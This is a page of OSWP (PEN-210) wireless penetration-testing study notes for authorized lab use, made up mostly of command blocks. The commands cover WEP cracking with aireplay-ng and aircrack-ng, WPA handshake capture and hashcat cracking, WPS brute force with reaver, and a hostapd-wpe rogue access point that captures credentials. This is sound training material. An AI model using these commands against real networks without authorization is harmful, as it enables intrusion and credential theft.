---
title: OSWP
---

# OSWP

PEN-210 wireless assessment notes. Transmit only inside an authorized RF
environment: a mistaken channel or interface can affect systems outside the lab.

## Adapter setup

```bash
# Identify the adapter, driver, supported bands, and interface modes
iw dev
iw phy
ethtool -i wlan0
iw list | sed -n '/Supported interface modes:/,/Band/p'

# Stop conflicting services and enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iw dev
```

Keep the original interface name, monitor interface name, target BSSID, channel,
and client MAC in the case notes.

## Passive discovery

```bash
# Survey nearby access points without transmitting
sudo airodump-ng wlan0mon

# Lock capture to the authorized BSSID and channel
sudo airodump-ng --bssid 02:00:00:00:01:00 --channel 6 --write captures/target wlan0mon

# Extract beacon, authentication, and EAPOL frames from a capture
tshark -r captures/target-01.cap -Y 'wlan.fc.type_subtype == 8 || wlan.fc.type_subtype == 11 || eapol'
```

Useful Wireshark filters:

```text
# Show one AP, management frames, handshakes, or deauthentication frames
wlan.bssid == 02:00:00:00:01:00
wlan.fc.type == 0
eapol
wlan.fc.type_subtype == 0x000c
```

## WEP lab workflow

```bash
# Confirm association state before generating lab traffic
sudo aireplay-ng --fakeauth 0 -a 02:00:00:00:01:00 wlan0mon

# Replay ARP traffic to increase IV collection in the lab
sudo aireplay-ng --arpreplay -b 02:00:00:00:01:00 wlan0mon

# Attempt recovery only after enough IVs have been captured
aircrack-ng -b 02:00:00:00:01:00 captures/target-01.cap
```

If injection produces no useful traffic, recheck channel lock, association,
client activity, signal level, and packet counters before changing attacks.

## WPA/WPA2 personal

```bash
# Capture a handshake for one authorized AP
sudo airodump-ng --bssid 02:00:00:00:01:00 --channel 6 --write captures/wpa wlan0mon

# Verify that the capture contains EAPOL key frames
tshark -r captures/wpa-01.cap -Y eapol
aircrack-ng captures/wpa-01.cap

# Convert captures to hashcat's modern 22000 format
hcxpcapngtool -o captures/wpa.22000 captures/wpa-01.cap

# Test a supplied lab wordlist
hashcat -m 22000 captures/wpa.22000 wordlists/lab.txt
```

## WPS

```bash
# Enumerate WPS-enabled APs and whether setup is locked
sudo wash -i wlan0mon

# Test the authorized AP with a bounded delay and explicit BSSID/channel
sudo reaver -i wlan0mon -b 02:00:00:00:01:00 -c 6 -d 5 -vv
```

## Enterprise and rogue AP labs

```bash
# Inspect EAP identity, method negotiation, and certificate exchange
tshark -r captures/enterprise.pcapng -Y 'eap || tls.handshake.certificate'

# Validate and start the supplied hostapd-wpe lab configuration
sudo hostapd-wpe -t configs/hostapd-wpe.conf
sudo hostapd-wpe configs/hostapd-wpe.conf

# Watch authentication events while the lab service runs
sudo journalctl -f | grep -Ei 'hostapd|eap|radius'
```

Check the server certificate, outer EAP identity, tunneled method, credential
format, and client validation behavior separately.

## Cleanup

```bash
# Disable monitor mode and restore network management
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
iw dev
```

## References

- [Official PEN-210 syllabus](https://manage.offsec.com/app/uploads/2026/03/PEN-210_Syllabus.pdf)
- [brcyrr OSWP notes](https://github.com/brcyrr/OSWP)
- [Wi-Fi pentesting cheatsheet](https://github.com/antlarac/Wi-Fi-Pentesting-Cheatsheet)
